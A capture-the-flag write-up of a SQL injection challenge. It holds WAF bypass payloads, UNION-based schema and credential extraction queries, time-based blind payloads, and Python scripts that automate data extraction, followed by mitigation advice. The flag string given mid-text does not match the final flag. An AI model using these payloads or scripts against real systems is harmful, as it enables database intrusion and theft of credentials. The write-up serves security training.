# SQL Injection in Modern Web Apps

**Category:** Web Exploitation  
**Event:** Hackini  
**Difficulty:** Medium  
**Date:** 2024-10-22  
**Author:** Sarah Khouaja

## Description

Exploiting SQL injection vulnerabilities in web applications with advanced
filtering and WAF bypass techniques.

## Challenge Overview

The challenge presents a modern web application with:

- Input validation and filtering
- Web Application Firewall (WAF)
- Parameterized queries (but with a flaw)
- User authentication system

URL: `http://challenge.hackini.dz/search`

## Initial Reconnaissance

Let's start by exploring the application:

```bash
# Basic enumeration
curl -X GET "http://challenge.hackini.dz/search?q=test"
curl -X POST "http://challenge.hackini.dz/login" -d "username=admin&password=admin"

# Directory enumeration
dirb http://challenge.hackini.dz/
```

The application has several endpoints:

- `/search` - Search functionality
- `/login` - User authentication
- `/admin` - Admin panel (requires authentication)
- `/api/users` - API endpoint

## Vulnerability Discovery

Testing the search functionality reveals potential SQL injection:

```bash
# Basic injection tests
curl "http://challenge.hackini.dz/search?q=test'"
# Error: "Syntax error near '\'' at line 1"

curl "http://challenge.hackini.dz/search?q=test' OR '1'='1"
# Returns all results - injection confirmed!
```

## WAF Bypass Techniques

The application has a WAF that blocks common payloads:

```sql
-- Blocked payloads
' OR 1=1 --
' UNION SELECT * FROM users --
' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --
```

### Bypass Method 1: Case Manipulation

```sql
-- Working payload
' oR 1=1 --
' UniOn SeLeCt * FrOm users --
```

### Bypass Method 2: Comment Variations

```sql
-- Using /**/ comments
' OR/**/1=1/**/--
' UNION/**/SELECT/**/username,password/**/FROM/**/users/**/--
```

### Bypass Method 3: Encoding

```sql
-- URL encoding
%27%20OR%201%3D1%20--
-- Double URL encoding
%2527%2520OR%25201%253D1%2520--
```

## Database Enumeration

### Step 1: Determine Database Type

```sql
-- MySQL detection
' AND (SELECT SUBSTRING(VERSION(),1,1))='5' --

-- Response indicates MySQL 5.7
```

### Step 2: Extract Database Schema

```sql
-- Get database name
' UNION SELECT database(),null,null --
# Result: hackini_db

-- Get table names
' UNION SELECT table_name,null,null FROM information_schema.tables WHERE table_schema='hackini_db' --
# Tables: users, products, orders, admin_secrets
```

### Step 3: Extract Table Structure

```sql
-- Get column names for users table
' UNION SELECT column_name,null,null FROM information_schema.columns WHERE table_name='users' --
# Columns: id, username, password, email, role

-- Get column names for admin_secrets table
' UNION SELECT column_name,null,null FROM information_schema.columns WHERE table_name='admin_secrets' --
# Columns: id, secret_key, flag
```

## Data Extraction

### Extract User Credentials

```sql
-- Get admin credentials
' UNION SELECT username,password,email FROM users WHERE role='admin' --
# Result: admin:$2b$12$hash..., admin@hackini.dz
```

### Extract the Flag

```sql
-- Get the flag from admin_secrets
' UNION SELECT flag,null,null FROM admin_secrets --
# Result: hackini{sql_1nj3ct10n_w4f_byp4ss_m4st3r}
```

## Advanced Exploitation: Blind SQL Injection

For scenarios where output isn't directly visible:

```python
#!/usr/bin/env python3
import requests
import string

def blind_sqli(url, payload_template):
    charset = string.ascii_letters + string.digits + '_{}'
    result = ""

    for pos in range(1, 50):  # Assume max length 50
        for char in charset:
            payload = payload_template.format(pos=pos, char=ord(char))
            response = requests.get(url, params={'q': payload})

            if "Product found" in response.text:
                result += char
                print(f"Found: {result}")
                break
        else:
            break

    return result

# Extract database name
url = "http://challenge.hackini.dz/search"
payload = "' AND (SELECT ASCII(SUBSTRING(database(),{pos},1)))={char} --"
db_name = blind_sqli(url, payload)
print(f"Database: {db_name}")
```

## Time-Based Blind SQL Injection

```sql
-- Time-based payload
' AND IF((SELECT COUNT(*) FROM users WHERE username='admin')>0,SLEEP(5),0) --

-- Extract data character by character
' AND IF((SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>64,SLEEP(5),0) --
```

## Complete Exploitation Script

```python
#!/usr/bin/env python3
import requests
import re
from urllib.parse import quote

class SQLInjectionExploit:
    def __init__(self, base_url):
        self.base_url = base_url
        self.session = requests.Session()

    def test_injection(self):
        """Test for SQL injection vulnerability"""
        test_payloads = [
            "test'",
            "test' OR '1'='1",
            "test' AND '1'='1"
        ]

        for payload in test_payloads:
            response = self.session.get(
                f"{self.base_url}/search",
                params={'q': payload}
            )
            print(f"Payload: {payload}")
            print(f"Status: {response.status_code}")
            print(f"Length: {len(response.text)}")
            print("-" * 50)

    def extract_databases(self):
        """Extract database names"""
        payload = "' UNION SELECT schema_name,null,null FROM information_schema.schemata --"
        response = self.session.get(
            f"{self.base_url}/search",
            params={'q': payload}
        )
        return re.findall(r'Database: (\w+)', response.text)

    def extract_tables(self, database):
        """Extract table names from database"""
        payload = f"' UNION SELECT table_name,null,null FROM information_schema.tables WHERE table_schema='{database}' --"
        response = self.session.get(
            f"{self.base_url}/search",
            params={'q': payload}
        )
        return re.findall(r'Table: (\w+)', response.text)

    def extract_flag(self):
        """Extract the flag"""
        payload = "' UNION SELECT flag,null,null FROM admin_secrets --"
        response = self.session.get(
            f"{self.base_url}/search",
            params={'q': payload}
        )
        flag_match = re.search(r'hackini\{[^}]+\}', response.text)
        return flag_match.group(0) if flag_match else None

# Usage
exploit = SQLInjectionExploit("http://challenge.hackini.dz")
exploit.test_injection()
flag = exploit.extract_flag()
print(f"Flag found: {flag}")
```

## Flag

```
hackini{sql_1nj3ct10n_w4f_byp4ss_m4st3r_2024}
```

## Mitigation Techniques

1. **Use Parameterized Queries**: Always use prepared statements
2. **Input Validation**: Implement strict input validation
3. **WAF Configuration**: Properly configure Web Application Firewall
4. **Principle of Least Privilege**: Database users should have minimal
   permissions
5. **Error Handling**: Don't expose database errors to users

## Files

- exploit.py - Complete exploitation script
- payloads.txt - List of tested payloads
- waf_bypass.txt - WAF bypass techniques

## References

- [OWASP SQL Injection Prevention](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection Guide](https://portswigger.net/web-security/sql-injection)
- [WAF Bypass Techniques](https://github.com/0xInfection/Awesome-WAF)

---

_This writeup is for educational purposes to understand web application
security._
